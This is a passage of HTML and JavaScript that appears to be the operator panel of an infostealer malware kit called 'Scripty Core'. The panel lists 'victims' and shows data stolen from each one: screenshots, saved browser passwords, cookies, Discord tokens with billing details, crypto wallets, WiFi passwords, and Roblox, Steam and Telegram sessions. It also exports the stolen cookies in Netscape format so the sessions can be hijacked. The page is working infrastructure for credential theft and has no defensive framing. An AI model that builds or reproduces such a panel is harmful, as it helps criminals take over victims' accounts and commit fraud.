                        console.warn('Rank calculation failed:', rankErr);
                        document.getElementById('globalRank').textContent = 'N/A';
                    }
                
                    // 3. Update stats and map
                    updateStatsAndCharts(allVictims);
                
                } catch (err) {
                    console.error(err);
                    showToast('Failed to load data', 'error');
                }
            }

            function renderDetails(victim) {
                const data = safeParseData(victim.data);
                const system = data.system || {};
                const passwords = data.passwords || [];
                const cookies = data.cookies || [];
                const additionalFiles = data.additionalFiles || [];
                const screenshot = data.screenshot || null;
                const discordAccounts = data.discord_accounts || [];
                const wallets = data.wallets || {};
                const walletNames = Object.keys(wallets);
                const wifiNetworks = data.wifi_networks || [];
                const roblox = data.roblox;
                const steam = data.steam || {};
                const telegram = data.telegram || false;

                const sysFields = [
                    { label: 'Username', value: system.user || victim.username || 'N/A' },
                    { label: 'PC Name', value: system.hostname || victim.hostname || 'N/A' },
                    { label: 'OS Version', value: system.os || victim.os || 'N/A' },
                    { label: 'CPU', value: system.cpu || 'N/A' },
                    { label: 'GPU', value: system.gpu || 'N/A' },
                    { label: 'RAM', value: system.ram || 'N/A' },
                ];
                const connFields = [
                    { label: 'IP Address', value: victim.ip || 'N/A' },
                    { label: 'Country', value: victim.country || 'N/A' },
                    { label: 'City', value: data.city || 'N/A' },
                    { label: 'ISP', value: data.isp || 'N/A' },
                    { label: 'Tag', value: data.tag || 'Default' },
                    { label: 'Environment', value: data.executionEnvironment || 'EXE' },
                    { label: 'Type', value: data.executionEnvironmentType || 'CPyRuntime' },
                ];

                const cookieGroups = {};
                cookies.forEach(c => {
                    const key = `${c.browser || 'Unknown'}_${c.profile || 'Default'}`;
                    if (!cookieGroups[key]) cookieGroups[key] = { browser: c.browser || 'Unknown', profile: c.profile || 'Default', cookies: [] };
                    cookieGroups[key].cookies.push(c);
                });

                let html = '';
                html += `<div class="hit-section screenshot-section"><div class="section-header"><i class="fas fa-camera"></i><span>Screenshot</span></div><div class="screenshot-container">${screenshot ? `<img src="${screenshot}" alt="Screenshot" class="screenshot-img" onclick="window.openScreenshot(this.src)">` : '<div class="empty">No screenshot available</div>'}</div></div>`;
                html += `<div class="hit-grid"><div class="hit-card"><div class="hit-card-header"><i class="fas fa-desktop"></i><span>System Information</span><span class="info-badge">full</span></div><div class="hit-card-body"><div class="info-grid">${sysFields.map(f => `<div class="info-item"><span class="info-label">${f.label}</span><span class="info-value copyable" data-copy="${f.value}">${f.value}</span></div>`).join('')}</div></div></div>`;
                html += `<div class="hit-card"><div class="hit-card-header"><i class="fas fa-globe"></i><span>Connection Info</span></div><div class="hit-card-body"><div class="info-grid">${connFields.map(f => `<div class="info-item"><span class="info-label">${f.label}</span><span class="info-value copyable" data-copy="${f.value}">${f.value}</span></div>`).join('')}</div></div></div></div>`;

                html += `<div class="hit-section"><div class="section-header"><i class="fas fa-key"></i><span>Passwords</span><span class="section-count">${passwords.length || data.total_passwords || 0}</span></div>${passwords.length > 0 ? `<div class="table-container table-scrollable"><table class="data-table"><thead><tr><th>URL</th><th>Username</th><th>Password</th><th>Browser</th><th>Profile</th></tr></thead><tbody>${passwords.map(p => `<tr><td class="copyable" data-copy="${p.url || ''}">${p.url || 'N/A'}</td><td class="copyable" data-copy="${p.username || ''}">${p.username || 'N/A'}</td><td class="password-cell"><span class="password-masked">********</span><span class="password-revealed">${p.password || ''}</span><button class="reveal-btn" onclick="window.togglePassword(this)"><i class="fas fa-eye eye-icon"></i><i class="fas fa-eye-slash eye-off-icon"></i></button></td><td><i class="${browserIcons[p.browser] || 'fas fa-globe'}"></i> ${p.browser || 'N/A'}</td><td>${p.profile || 'N/A'}</td></tr>`).join('')}</tbody></table></div>` : `<div class="empty">No passwords found.</div>`}</div>`;

                html += `<div class="hit-section"><div class="section-header"><i class="fas fa-cookie-bite"></i><span>Cookies</span><span class="section-count">${cookies.length || data.total_cookies || 0}</span></div>${Object.keys(cookieGroups).length > 0 ? `<div class="cookies-container"><div class="cookie-profiles">${Object.values(cookieGroups).map(group => `<div class="cookie-profile" data-browser="${group.browser}" data-profile="${group.profile}"><div class="cookie-profile-header"><div class="cookie-profile-info"><span class="cookie-browser"><i class="${browserIcons[group.browser] || 'fas fa-globe'}"></i> ${group.browser}</span><span class="cookie-profile-name">${group.profile}</span><span class="cookie-count">${group.cookies.length} cookies</span></div><div class="cookie-actions"><button class="btn btn-sm btn-secondary" onclick="window.copyCookieGroup(this)"><i class="fas fa-copy"></i> Copy</button><button class="btn btn-sm btn-primary" onclick="window.downloadCookieGroup(this)"><i class="fas fa-download"></i> Download</button></div></div></div>`).join('')}</div></div>` : `<div class="empty">No cookies found.</div>`}</div>`;

                html += `<div class="hit-section"><div class="section-header"><i class="fas fa-file"></i><span>Additional Files</span><span class="section-count">${additionalFiles.length}</span></div>${additionalFiles.length > 0 ? `<div class="files-container"><div class="file-categories">${Object.entries(groupFiles(additionalFiles)).map(([type, files]) => `<div class="file-category"><div class="file-category-header"><span class="file-category-name">${type}</span><span class="file-category-count">${files.length} files</span></div><div class="file-list">${files.map(f => `<div class="file-item"><div class="file-info"><i class="fas fa-file-alt"></i><span class="file-name">${f.fileName || 'Unknown'}</span><span class="file-size">${formatSize(f.fileSize || 0)}</span></div><button class="btn btn-sm btn-secondary" onclick="window.downloadFile('${f.fileId || ''}', '${f.fileName || ''}')"><i class="fas fa-download"></i></button></div>`).join('')}</div></div>`).join('')}</div></div>` : `<div class="empty">No additional files.</div>`}</div>`;

                html += `<div class="hit-section"><div class="section-header"><i class="fab fa-discord"></i><span>Discord Tokens</span><span class="section-count">${discordAccounts.length}</span></div>${discordAccounts.length > 0 ? `<div class="table-container table-scrollable"><table class="data-table"><thead><tr><th>Username</th><th>Email</th><th>Token</th><th>Nitro</th><th>Billing</th></tr></thead><tbody>${discordAccounts.map(a => `<tr><td>${a.username || 'N/A'}</td><td>${a.email || 'N/A'}</td><td class="copyable" data-copy="${a.token}">${a.token}</td><td>${a.premium > 0 ? (a.premium === 2 ? 'Boost' : 'Classic') : 'None'}</td><td>${a.billing || 'None'}</td></tr>`).join('')}</tbody></table></div>` : `<div class="empty">No Discord tokens found.</div>`}</div>`;

                html += `<div class="hit-section"><div class="section-header"><i class="fas fa-wallet"></i><span>Wallets</span><span class="section-count">${walletNames.length}</span></div>${walletNames.length > 0 ? `<div class="cookies-container"><ul>${walletNames.map(w => `<li>${w}</li>`).join('')}</ul></div>` : `<div class="empty">No wallets found.</div>`}</div>`;

                html += `<div class="hit-section"><div class="section-header"><i class="fas fa-wifi"></i><span>WiFi Networks</span><span class="section-count">${wifiNetworks.length}</span></div>${wifiNetworks.length > 0 ? `<div class="table-container table-scrollable"><table class="data-table"><thead><tr><th>SSID</th><th>Password</th></tr></thead><tbody>${wifiNetworks.map(w => `<tr><td>${w.ssid}</td><td class="password-cell"><span class="password-masked">********</span><span class="password-revealed">${w.password || ''}</span><button class="reveal-btn" onclick="window.togglePassword(this)"><i class="fas fa-eye eye-icon"></i><i class="fas fa-eye-slash eye-off-icon"></i></button></td></tr>`).join('')}</tbody></table></div>` : `<div class="empty">No WiFi networks saved.</div>`}</div>`;

                if (roblox) {
                    html += `<div class="hit-section"><div class="section-header"><i class="fas fa-robot"></i><span>Roblox</span></div><div class="hit-card-body"><div class="info-grid">
                        <div class="info-item"><span class="info-label">Username</span><span class="info-value">${roblox.name || 'N/A'}</span></div>
                        <div class="info-item"><span class="info-label">Robux</span><span class="info-value">${roblox.robux || 0}</span></div>
                        <div class="info-item"><span class="info-label">Premium</span><span class="info-value">${roblox.premium ? 'Yes' : 'No'}</span></div>
                        <div class="info-item"><span class="info-label">Cookie</span><span class="info-value copyable" data-copy="${roblox.cookie || ''}">${roblox.cookie ? '********' : 'N/A'}</span></div>
                    </div></div></div>`;
                }

                if (steam && steam.account_name) {
                    html += `<div class="hit-section"><div class="section-header"><i class="fab fa-steam"></i><span>Steam</span></div><div class="hit-card-body"><div class="info-grid">
                        <div class="info-item"><span class="info-label">Account</span><span class="info-value">${steam.account_name || 'N/A'}</span></div>
                        <div class="info-item"><span class="info-label">Steam ID</span><span class="info-value">${steam.steam_id || 'N/A'}</span></div>
                    </div></div></div>`;
                }

                if (telegram) {
                    html += `<div class="hit-section"><div class="section-header"><i class="fab fa-telegram"></i><span>Telegram</span></div><div class="empty">Telegram session data found.</div></div>`;
                }

                document.getElementById('detailsContent').innerHTML = html;
                window._victimData = victim;

                document.querySelectorAll('.copyable[data-copy]').forEach(el => {
                    el.addEventListener('click', function() {
                        const text = this.dataset.copy;
                        if (text && text !== 'N/A' && text !== '') {
                            navigator.clipboard.writeText(text).then(() => showToast('Copied')).catch(() => showToast('Failed', 'error'));
                        }
                    });
                });
            }

            function groupFiles(files) {
                const groups = {};
                files.forEach(f => {
                    const type = f.fileType || 'Other';
                    if (!groups[type]) groups[type] = [];
                    groups[type].push(f);
                });
                return groups;
            }

            function formatSize(bytes) {
                if (!bytes) return '0 B';
                const units = ['B', 'KB', 'MB', 'GB'];
                let i = 0;
                while (bytes >= 1024 && i < units.length - 1) { bytes /= 1024; i++; }
                return bytes.toFixed(i > 0 ? 1 : 0) + ' ' + units[i];
            }

            function generateNetscapeCookies(cookies) {
                let lines = ['# Netscape HTTP Cookie File', '# Generated by Scripty Core', ''];
                cookies.forEach(c => {
                    const host = c.hostKey || c.host || '';
                    const hostOnly = host.startsWith('.') ? 'FALSE' : 'TRUE';
                    const path = c.path || '/';
                    const secure = 'FALSE';
                    const expiry = c.expiresUtc ? Math.floor(c.expiresUtc / 1000000) : '1893456000';
                    const name = c.name || '';
                    const value = c.value || '';
                    lines.push(`${host}\t${hostOnly}\t${path}\t${secure}\t${expiry}\t${name}\t${value}`);
                });
                return lines.join('\n');
            }

            window.togglePassword = function(btn) {
                const cell = btn.closest('.password-cell');
                cell.classList.toggle('revealed');
            };

            window.openScreenshot = function(src) {
                const overlay = document.createElement('div');
                overlay.className = 'screenshot-overlay';
                overlay.innerHTML = `<div class="screenshot-lightbox"><img src="${src}" alt="Screenshot"><button class="lightbox-close" onclick="this.closest('.screenshot-overlay').remove()">&times;</button></div>`;
                overlay.addEventListener('click', (e) => { if (e.target === overlay) overlay.remove(); });
                document.body.appendChild(overlay);
            };

            window.copyCookieGroup = function(btn) {
                const profile = btn.closest('.cookie-profile');
                const browser = profile.dataset.browser;
                const profileName = profile.dataset.profile;
                const cookies = window._victimData ? safeParseData(window._victimData.data).cookies || [] : [];
                const groupCookies = cookies.filter(c => c.browser === browser && c.profile === profileName);
                const content = generateNetscapeCookies(groupCookies);
                navigator.clipboard.writeText(content).then(() => showToast('Cookies copied')).catch(() => showToast('Failed', 'error'));
            };

            window.downloadCookieGroup = function(btn) {
                const profile = btn.closest('.cookie-profile');
                const browser = profile.dataset.browser;
                const profileName = profile.dataset.profile;
                const cookies = window._victimData ? safeParseData(window._victimData.data).cookies || [] : [];
                const groupCookies = cookies.filter(c => c.browser === browser && c.profile === profileName);
                const content = generateNetscapeCookies(groupCookies);
                const blob = new Blob([content], { type: 'text/plain' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `${browser}_${profileName}_cookies.txt`;
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
                showToast('Cookies downloaded');
            };

            window.downloadFile = function(fileId, fileName) {
                showToast('File download coming soon (fileId: ' + fileId + ')', 'warning');
            };

            window.downloadAll = function() {
                if (!window._victimData) return;
                const data = safeParseData(window._victimData.data);
                const zipUrl = data.logs_zip;
                if (zipUrl) {
                    const a = document.createElement('a');
                    a.href = zipUrl;
                    a.download = 'logs.zip';
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    showToast('Downloading logs.zip...');
                } else {
                    showToast('No zip available for this hit.', 'warning');
                }
            };

            function showToast(message, type = 'success') {
                const toast = document.createElement('div');
                toast.style.cssText = `position:fixed; bottom:20px; right:20px; padding:12px 24px; border-radius:var(--radius-md); background:var(--bg-secondary); border:1px solid var(--border-color); color:var(--text-primary); box-shadow:0 4px 20px rgba(0,0,0,0.5); z-index:9999; font-size:14px; display:flex; align-items:center; gap:12px; opacity:0; transform:translateY(20px); transition:opacity 0.3s, transform 0.3s; pointer-events:none;`;
                const icons = { success: '<i class="fas fa-check-circle" style="color:var(--success)"></i>', error: '<i class="fas fa-exclamation-circle" style="color:var(--danger)"></i>', warning: '<i class="fas fa-exclamation-triangle" style="color:var(--warning)"></i>' };
                toast.innerHTML = `${icons[type] || icons.success} ${message}`;
                document.body.appendChild(toast);
                requestAnimationFrame(() => { toast.style.opacity = '1'; toast.style.transform = 'translateY(0)'; });
                setTimeout(() => {
                    toast.style.opacity = '0';
                    toast.style.transform = 'translateY(20px)';
                    setTimeout(() => toast.remove(), 300);
                }, 3000);
            }

            // ===== INIT =====
            supabaseClient.auth.getSession().then(({ data: { session } }) => {
                if (!session) { window.location.href = 'login.html'; return; }
                currentUser = session.user;
            
                const user = session.user;
                const avatarUrl = user.user_metadata?.avatar_url || '';
                const userName = user.user_metadata?.full_name || user.user_metadata?.name || user.email || 'User';
                const email = user.email || '';
            
                document.getElementById('sidebarUsername').textContent = userName;
                document.getElementById('sidebarEmail').textContent = email;
                document.getElementById('dashUsername').textContent = userName || 'Admin';
            
                const avatarImg = document.getElementById('avatarImg');
                const defaultIcon = document.getElementById('defaultAvatarIcon');
                if (avatarUrl) {
                    avatarImg.src = avatarUrl;
                    avatarImg.style.display = 'block';
                    defaultIcon.style.display = 'none';
                } else {
                    avatarImg.style.display = 'none';
                    defaultIcon.style.display = 'block';
                }
                supabaseClient.from('profiles').upsert({
                    id: user.id,
                    username: userName,
                    avatar_url: avatarUrl,
                    updated_at: new Date().toISOString()
                }, { onConflict: 'id' }).then(({ error }) => {
                    if (error) console.warn('Profile upsert failed:', error);
                });

                fetchData();

                const params = new URLSearchParams(window.location.search);
                const viewId = params.get('view');
                if (viewId) {
                    window.showDetails(viewId);
                }
            });
            setInterval(() => { if (currentUser) fetchData(); }, 30000);
        })();
    </script>
</body>
</html>
